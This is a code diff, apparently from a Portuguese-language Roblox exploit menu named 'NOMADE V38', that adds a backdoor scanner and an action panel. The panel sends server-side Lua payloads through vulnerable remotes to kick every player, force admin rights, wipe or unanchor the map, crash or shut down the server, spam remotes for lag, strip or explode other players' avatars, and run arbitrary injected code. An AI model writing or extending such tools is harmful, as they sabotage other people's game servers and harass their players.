+    ActionLabel.TextSize = 12
+    ActionLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    ActionLabel.BackgroundTransparency = 1
+    ActionLabel.Size = UDim2.new(1, -20, 0, 20)
+    ActionLabel.Position = UDim2.new(0, 10, 0, 5)
+    ActionLabel.TextXAlignment = Enum.TextXAlignment.Left
+    ActionLabel.Parent = ActionPanel
+    
+    local SelectedLabel = Instance.new("TextLabel")
+    SelectedLabel.Text = "Nenhum"
+    SelectedLabel.Font = Enum.Font.Gotham
+    SelectedLabel.TextSize = 11
+    SelectedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    SelectedLabel.BackgroundTransparency = 1
+    SelectedLabel.Size = UDim2.new(1, -20, 0, 15)
+    SelectedLabel.Position = UDim2.new(0, 10, 0, 20)
+    SelectedLabel.TextXAlignment = Enum.TextXAlignment.Left
+    SelectedLabel.Parent = ActionPanel
+    
+    local function CreateActionButton(text, func, parent)
+        -- Helper to create buttons inside the ActionPanel
+        local btn = Instance.new("TextButton")
+        btn.Text = text
+        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 11
+        btn.Size = UDim2.new(0.45, -5, 0, 25)
+        btn.AutoButtonColor = false
+        btn.Parent = parent -- Set parent directly
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 4)
+        corner.Parent = btn
+        
+        btn.MouseButton1Click:Connect(function()
+            UI:Tween(btn, {BackgroundColor3 = Color3.fromRGB(100, 80, 255)}, 0.1)
+            task.wait(0.1)
+            UI:Tween(btn, {BackgroundColor3 = Color3.fromRGB(40, 40, 45)}, 0.2)
+            if SelectedBackdoor then
+                func(SelectedBackdoor)
+            else
+                SendNotification("Erro", "Nenhum backdoor selecionado!", 2)
+            end
+        end)
+        
+        return btn
+    end
+    
+    -- Layout for Action Buttons inside a ScrollingFrame for better navigation
+    local ActionScroll = Instance.new("ScrollingFrame")
+    ActionScroll.BackgroundTransparency = 1
+    ActionScroll.Size = UDim2.new(1, -10, 1, -40)
+    ActionScroll.Position = UDim2.new(0, 5, 0, 40)
+    ActionScroll.BorderSizePixel = 0
+    ActionScroll.ScrollBarThickness = 2
+    ActionScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    ActionScroll.CanvasSize = UDim2.new(0,0,0,0)
+    ActionScroll.Parent = ActionPanel
+
+    local ActionGrid = Instance.new("UIGridLayout")
+    ActionGrid.CellSize = UDim2.new(0.48, 0, 0, 30)
+    ActionGrid.CellPadding = UDim2.new(0, 5, 0, 5)
+    ActionGrid.SortOrder = Enum.SortOrder.LayoutOrder
+    ActionGrid.Parent = ActionScroll
+    
+    -- Add Buttons to Action Panel (Scrollable)
+    CreateActionButton("Testar Conexão (Ping)", function(remote) 
+        AttemptBackdoorExec("print('Ping Test')", remote)
+        SendNotification("Action", "Ping enviado para " .. remote.Name, 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Kick All Players", function(remote)
+        AttemptBackdoorExec("for _,v in pairs(game.Players:GetPlayers()) do v:Kick('Server Maintenance') end", remote)
+        SendNotification("Action", "Tentando expulsar todos...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Grant Me Admin (Force)", function(remote)
+        AttemptBackdoorExec(Payloads.ForceAdmin, remote)
+        SendNotification("Action", "Injetando admin via " .. remote.Name, 2)
+    end, ActionScroll)
+
+    CreateActionButton("Spam This Remote", function(remote)
+        if BackdoorSpamming then
+            BackdoorSpamming = false
+            SendNotification("Spam", "Spam parado.", 2)
+        else
+            BackdoorSpamming = true
+            SendNotification("Spam", "Spam iniciado em " .. remote.Name, 2)
+            task.spawn(function()
+                while BackdoorSpamming and remote.Parent do
+                    pcall(function() 
+                        if remote:IsA("RemoteEvent") then remote:FireServer("LAG_TEST") 
+                        elseif remote:IsA("RemoteFunction") then remote:InvokeServer("LAG_TEST") end
+                    end)
+                    task.wait(0.05)
+                end
+            end)
+        end
+    end, ActionScroll)
+    
+    CreateActionButton("Destruir Mapa", function(remote)
+        AttemptBackdoorExec("game.Workspace:ClearAllChildren()", remote)
+        SendNotification("Action", "Tentando limpar workspace...", 2)
+    end, ActionScroll)
+
+    CreateActionButton("Server Hop (Crash)", function(remote)
+         AttemptBackdoorExec("while true do end", remote)
+         SendNotification("Action", "Enviando loop infinito...", 2)
+    end, ActionScroll)
+    
+    -- NOVAS FUNÇÕES ADICIONADAS
+    CreateActionButton("Shutdown Server", function(remote)
+        AttemptBackdoorExec("game:Shutdown()", remote)
+        SendNotification("Action", "Enviando comando Shutdown...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Force Unanchor (All)", function(remote)
+        AttemptBackdoorExec(Payloads.UnanchorMap, remote)
+        SendNotification("Action", "Soltando física do mapa...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Remove Legs (Troll)", function(remote)
+        AttemptBackdoorExec("for _,v in pairs(game.Players:GetPlayers()) do if v.Character then v.Character['Left Leg']:Destroy(); v.Character['Right Leg']:Destroy() end end", remote)
+        SendNotification("Action", "Tentando remover pernas...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Naked All (Troll)", function(remote)
+        AttemptBackdoorExec("for _,v in pairs(game.Players:GetPlayers()) do if v.Character then for _,x in pairs(v.Character:GetChildren()) do if x:IsA('Shirt') or x:IsA('Pants') then x:Destroy() end end end end", remote)
+        SendNotification("Action", "Removendo roupas...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Explosion Loop", function(remote)
+        AttemptBackdoorExec("while wait(0.5) do for _,v in pairs(game.Players:GetPlayers()) do if v.Character and v.Character:FindFirstChild('Head') then Instance.new('Explosion', v.Character.Head).Position = v.Character.Head.Position end end end", remote)
+        SendNotification("Action", "Iniciando loop de explosão...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Play Sound (Earrape)", function(remote)
+        AttemptBackdoorExec("local s = Instance.new('Sound', workspace); s.SoundId = 'rbxassetid://130776150'; s.Looped = true; s:Play()", remote)
+        SendNotification("Action", "Tocando som...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Btools Everyone", function(remote)
+        AttemptBackdoorExec("for _,v in pairs(game.Players:GetPlayers()) do Instance.new('HopperBin', v.Backpack).BinType = 4 end", remote)
+        SendNotification("Action", "Dando Hammer...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Force Field All", function(remote)
+         AttemptBackdoorExec("for _,v in pairs(game.Players:GetPlayers()) do if v.Character then Instance.new('ForceField', v.Character) end end", remote)
+         SendNotification("Action", "Dando ForceField...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Give Cash (Generic)", function(remote)
+         -- Tenta nomes comuns de stats
+         AttemptBackdoorExec("game.Players.LocalPlayer.leaderstats.Cash.Value = 999999", remote)
+         AttemptBackdoorExec("game.Players.LocalPlayer.leaderstats.Money.Value = 999999", remote)
+         AttemptBackdoorExec("game.Players.LocalPlayer.leaderstats.Coins.Value = 999999", remote)
+         SendNotification("Action", "Tentando adicionar dinheiro...", 2)
+    end, ActionScroll)
+    
+    CreateActionButton("Get All Tools", function(remote)
+         AttemptBackdoorExec("for _,v in pairs(game.ServerStorage:GetDescendants()) do if v:IsA('Tool') then v:Clone().Parent = game.Players.LocalPlayer.Backpack end end", remote)
+         AttemptBackdoorExec("for _,v in pairs(game.Lighting:GetDescendants()) do if v:IsA('Tool') then v:Clone().Parent = game.Players.LocalPlayer.Backpack end end", remote)
+         SendNotification("Action", "Tentando pegar itens...", 2)
+    end, ActionScroll)
+    
+    
+    local function UpdateResultsList()
+        for _, c in pairs(ScanResultsContainer:GetChildren()) do
+            if c:IsA("Frame") then c:Destroy() end
+        end
+        
+        if #BackdoorResults == 0 then
+            local EmptyLbl = Instance.new("TextLabel")
+            EmptyLbl.Text = "Nenhuma vulnerabilidade encontrada."
+            EmptyLbl.Size = UDim2.new(1, 0, 0, 30)
+            EmptyLbl.BackgroundTransparency = 1
+            EmptyLbl.TextColor3 = Color3.fromRGB(100, 100, 100)
+            EmptyLbl.Parent = ScanResultsContainer
+            return
+        end
+        
+        for _, res in pairs(BackdoorResults) do
+            local Item = Instance.new("Frame")
+            Item.Size = UDim2.new(1, -5, 0, 60) -- Altura maior para detalhes
+            Item.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+            Item.Parent = ScanResultsContainer
+            
+            local IC = Instance.new("UICorner")
+            IC.CornerRadius = UDim.new(0, 4)
+            IC.Parent = Item
+            
+            local RiskColor = Color3.fromRGB(100, 255, 100)
+            if res.Risk == "CRITICO" then RiskColor = Color3.fromRGB(255, 50, 50)
+            elseif res.Risk == "ALTO" then RiskColor = Color3.fromRGB(255, 150, 50)
+            elseif res.Risk == "MEDIO" then RiskColor = Color3.fromRGB(255, 255, 100)
+            elseif res.Risk == "SAFE" then RiskColor = Color3.fromRGB(100, 100, 100) end
+            
+            local NameLbl = Instance.new("TextLabel")
+            NameLbl.Text = res.Instance.Name
+            NameLbl.Font = Enum.Font.GothamBold
+            NameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+            NameLbl.TextSize = 13
+            NameLbl.BackgroundTransparency = 1
+            NameLbl.Position = UDim2.new(0, 10, 0, 5)
+            NameLbl.Size = UDim2.new(0.6, 0, 0, 15)
+            NameLbl.TextXAlignment = Enum.TextXAlignment.Left
+            NameLbl.Parent = Item
+            
+            local DescLbl = Instance.new("TextLabel")
+            DescLbl.Text = res.Desc
+            DescLbl.Font = Enum.Font.Gotham
+            DescLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
+            DescLbl.TextSize = 11
+            DescLbl.BackgroundTransparency = 1
+            DescLbl.Position = UDim2.new(0, 10, 0, 22)
+            DescLbl.Size = UDim2.new(0.6, 0, 0, 15)
+            DescLbl.TextXAlignment = Enum.TextXAlignment.Left
+            DescLbl.Parent = Item
+            
+            local RiskLbl = Instance.new("TextLabel")
+            RiskLbl.Text = res.Risk
+            RiskLbl.Font = Enum.Font.GothamBold
+            RiskLbl.TextColor3 = RiskColor
+            RiskLbl.TextSize = 11
+            RiskLbl.BackgroundTransparency = 1
+            RiskLbl.Position = UDim2.new(0, 10, 0, 40)
+            RiskLbl.Size = UDim2.new(0.3, 0, 0, 15)
+            RiskLbl.TextXAlignment = Enum.TextXAlignment.Left
+            RiskLbl.Parent = Item
+            
+            local ExploitBtn = Instance.new("TextButton")
+            ExploitBtn.Text = "EXPLORAR"
+            ExploitBtn.BackgroundColor3 = RiskColor
+            ExploitBtn.TextColor3 = Color3.new(0,0,0)
+            ExploitBtn.Font = Enum.Font.GothamBold
+            ExploitBtn.TextSize = 11
+            ExploitBtn.Size = UDim2.new(0, 80, 0, 30)
+            ExploitBtn.Position = UDim2.new(1, -90, 0.5, -15)
+            ExploitBtn.Parent = Item
+            
+            local BC = Instance.new("UICorner")
+            BC.CornerRadius = UDim.new(0, 4)
+            BC.Parent = ExploitBtn
+            
+            ExploitBtn.MouseButton1Click:Connect(function()
+                SelectedBackdoor = res.Instance
+                SelectedLabel.Text = "Alvo: " .. res.Instance.Name .. " (" .. res.Risk .. ")"
+                
+                -- Expand Action Panel
+                ActionPanel.Visible = true
+                UI:Tween(ActionPanel, {Size = UDim2.new(1, -10, 0, 220)}, 0.3) -- Aumentado para caber mais botões
+                
+                if LogConsole then LogConsole("Selecionado: " .. res.Instance.Name, Color3.fromRGB(100, 255, 100)) end
+            end)
+        end
+        ScanResultsContainer.CanvasSize = UDim2.new(0, 0, 0, (#BackdoorResults * 65) + 10)
+    end
+
+    BackdoorTab:Button("Escanear Vulnerabilidades (Deep Scan)", function()
+        -- Reset Action Panel
+        ActionPanel.Visible = false
+        ActionPanel.Size = UDim2.new(1, -10, 0, 0)
+        SelectedBackdoor = nil
+        
+        local count = ScanForBackdoorsV4()
+        UpdateResultsList()
+        SendNotification("Scanner V4", "Análise completa. Encontrados: " .. tostring(count), 4)
+    end)
+    
+    -- Inserir o container na UI
+    local ContainerFrame = Instance.new("Frame")
+    ContainerFrame.Size = UDim2.new(1, -10, 0, 160)
+    ContainerFrame.BackgroundTransparency = 1
+    ContainerFrame.Parent = BackdoorTab.Page
+    table.insert(ThemeObjects.Elements, ContainerFrame) -- Para tema funcionar, mas é transparente
+    
+    ScanResultsContainer.Parent = ContainerFrame
+    
+    -- Move ActionPanel to appear AFTER the results container in layout order
+    -- The layout order is determined by insertion order or LayoutOrder property if using UIListLayout
+    -- Since we use manual parenting here, we ensure elements are added in correct sequence in the tab
+    
+    BackdoorTab:Section("FERRAMENTAS SS (SERVER-SIDE)")
+    BackdoorTab:Button("Force Admin (V2 Advanced)", function()
+        SendNotification("Force Admin", "Tentando injeção em HD/Kohl's/BAE...", 3)
+        AttemptBackdoorExec(Payloads.ForceAdmin) 
+    end)
+    
+    BackdoorTab:Button("Get Btools (All)", function()
+        AttemptBackdoorExec("local p = game.Players.LocalPlayer; local h = Instance.new('HopperBin', p.Backpack); h.BinType = 4")
+        AttemptBackdoorExec("local p = game.Players.LocalPlayer; local h = Instance.new('HopperBin', p.Backpack); h.BinType = 3")
+        AttemptBackdoorExec("local p = game.Players.LocalPlayer; local h = Instance.new('HopperBin', p.Backpack); h.BinType = 1")
+    end)
+    
+    BackdoorTab:Button("Message All (System)", function()
+        AttemptBackdoorExec("local m = Instance.new('Message', workspace); m.Text = 'NOMADE ON TOP'; wait(5); m:Destroy()")
+    end)
+    
+    BackdoorTab:Section("INTERAÇÃO GLOBAL (PHYSICS/PLAYER)")
+    BackdoorTab:Button("Unanchor Map (Physics Abuse)", function()
+        AttemptBackdoorExec(Payloads.UnanchorMap)
+        SendNotification("SS Destroyer", "Tentando soltar peças do mapa...", 2)
+    end)
+    
+    BackdoorTab:Button("Force Sit All (Player Abuse)", function()
+        AttemptBackdoorExec("for _,v in pairs(game.Players:GetPlayers()) do if v.Character and v.Character:FindFirstChild('Humanoid') then v.Character.Humanoid.Sit = true end end")
+    end)
+    
+    BackdoorTab:Button("Destruir Mapa (Clear)", function()
+        AttemptBackdoorExec("game.Workspace:ClearAllChildren()")
+    end)
+    
+    BackdoorTab:Button("Crash Server (Loop - RISCO)", function()
+         AttemptBackdoorExec(Payloads.Crash)
+    end)
+
+    BackdoorTab:Section("EXECUÇÃO REMOTA")
+    BackdoorTab:TextBox("SS Payload (Lua Code)", Config.Backdoor, "SSCode")
+    BackdoorTab:Button("Executar Código (SS)", function()
+        AttemptBackdoorExec(Config.Backdoor.SSCode)
+    end)
+    BackdoorTab:Section("ATAQUE DE REDE")
+    BackdoorTab:Toggle("Server Lag (Remote Spam)", Config.Backdoor, "SpamRemotes", SpamRemotes, true)
+    BackdoorTab:Slider("Delay Spam (ms)", 0.01, 1, Config.Backdoor, "SpamDelay")
 
     local TrollTab = Menu:Tab("TROLL")
     TrollTab:Section("SELEÇÃO DE ALVO")
@@ -2112,6 +2986,7 @@ local function StartNomade()
     end)
     TrollTab:Section("ANNOY PLAYERS (GLOBAL)")
     TrollTab:Toggle("Touch Fling (Girar/Tocar)", Config.Troll, "Fling", ToggleFling, true)
+    TrollTab:Toggle("Spin Character (Troll Spin)", Config.Troll, "TrollSpin", ToggleTrollSpin, true) -- Nova Função V38
     TrollTab:Slider("Rotação Fling", 100, 5000, Config.Troll, "FlingPower")
     TrollTab:Section("CHAT")
     TrollTab:Toggle("Spam Chat (Universal)", Config.Troll, "SpamChat", ToggleSpam)
@@ -2136,7 +3011,7 @@ local function StartNomade()
 
     local SettingsTab = Menu:Tab("CONFIGURAÇÃO")
     SettingsTab:Section("APARÊNCIA")
-    SettingsTab:Dropdown("Selecionar Tema", {"Nomade", "Cyberpunk", "CottonCandy", "DarkVader", "Halloween", "Natal"}, function(selected)
+    SettingsTab:Dropdown("Selecionar Tema", {"Nomade", "Cyberpunk", "CottonCandy", "DarkVader", "Halloween", "Natal", "ProxyMenu"}, function(selected)
         UI:ApplyTheme(selected)
     end)
     SettingsTab:Section("DISPOSITIVO")
@@ -2149,7 +3024,7 @@ local function StartNomade()
     SettingsTab:Section("SISTEMA")
     SettingsTab:Button("Destruir Menu (Kill)", function()
         PerformCleanup()
-        game:GetService("CoreGui").NomadeUI_26:Destroy() -- Tentativa genérica
+        game:GetService("CoreGui").NomadeUI_26:Destroy()
         if MainFrame then MainFrame.Parent:Destroy() end
     end)
 
@@ -2157,7 +3032,7 @@ local function StartNomade()
     if not IsMobile then
         local WatermarkFrame = Instance.new("Frame")
         WatermarkFrame.Size = UDim2.new(0, 220, 0, 50)
-        WatermarkFrame.Position = UDim2.new(0, 15, 1, -65) -- Bottom Left (Improved Pos)
+        WatermarkFrame.Position = UDim2.new(0, 15, 1, -65)
         WatermarkFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
         WatermarkFrame.BorderSizePixel = 0
         WatermarkFrame.Parent = ScreenGui
@@ -2172,7 +3047,7 @@ local function StartNomade()
         WStroke.Parent = WatermarkFrame
         
         local WTitle = Instance.new("TextLabel")
-        WTitle.Text = "NOMADE V31 ULTIMATE"
+        WTitle.Text = "NOMADE V38 ULTIMATE"
         WTitle.Font = Enum.Font.GothamBlack
         WTitle.TextSize = 14
         WTitle.TextColor3 = Color3.fromRGB(120, 90, 255)
@@ -2212,7 +3087,7 @@ local function StartNomade()
     if IsMobile then
         local MobileGui = Instance.new("ScreenGui")
         MobileGui.Name = "NomadeMobile"
-        MobileGui.IgnoreGuiInset = true -- Better for mobile placement
+        MobileGui.IgnoreGuiInset = true 
         protect_gui(MobileGui)
         RegisterCleanup(MobileGui)
         
@@ -2224,13 +3099,13 @@ local function StartNomade()
         MobBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
         MobBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
         MobBtn.Size = UDim2.new(0, 50, 0, 50)
-        MobBtn.Position = UDim2.new(0, 50, 0.5, -25) -- Adjusted position
+        MobBtn.Position = UDim2.new(0, 50, 0.5, -25)
         MobBtn.AutoButtonColor = false
         MobBtn.Active = true
         MobBtn.Parent = MobileGui
         
         local MC = Instance.new("UICorner")
-        MC.CornerRadius = UDim.new(0, 16) -- Slightly more rounded
+        MC.CornerRadius = UDim.new(0, 16)
         MC.Parent = MobBtn
         
         local MStroke = Instance.new("UIStroke")
@@ -2304,7 +3179,7 @@ local function CreateLoader()
     
     -- Header Area
     local Title = Instance.new("TextLabel")
-    Title.Text = "NOMADE V31"
+    Title.Text = "NOMADE V38"
     Title.Font = Enum.Font.GothamBlack
     Title.TextSize = 32
     Title.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -2357,14 +3232,12 @@ local function CreateLoader()
     
     local LogText = Instance.new("TextLabel")
     LogText.Text = [[
-• Reformulação Visual da Interface (Botões Laterais)
-• Correção de Foto de Perfil (Profile Picture)
-• Correção da Lista de Jogadores (Tempo Real)
-• Adicionado ESP Esqueleto
-• Suporte Mobile Aprimorado
-• TriggerBot 100% Funcional
-• Novas Funções Troll Adicionadas
-• Otimização de Performance
+• BACKDOOR V4 (ADVANCED):
+  - Scanner de Risco Detalhado (Descrições Técnicas).
+  - Force Admin V2: Injeção direta em HD/Kohl's/BAE.
+  - Painel de Diagnóstico Interativo com Botões de Ação.
+  - Payloads: Unanchor, Force Sit, Crash.
+• UI FIX: Sidebar otimizada para todos os monitores.
 ]]
     LogText.Font = Enum.Font.Gotham
     LogText.TextSize = 13
@@ -2392,7 +3265,7 @@ local function CreateLoader()
         
         local BtnStroke = Instance.new("UIStroke")
         BtnStroke.Color = Color3.fromRGB(60, 60, 70)
-        BtnStroke.Thickness = 1
+        BtnStroke.Thickness = 1.5
         BtnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
         BtnStroke.Parent = Btn
         
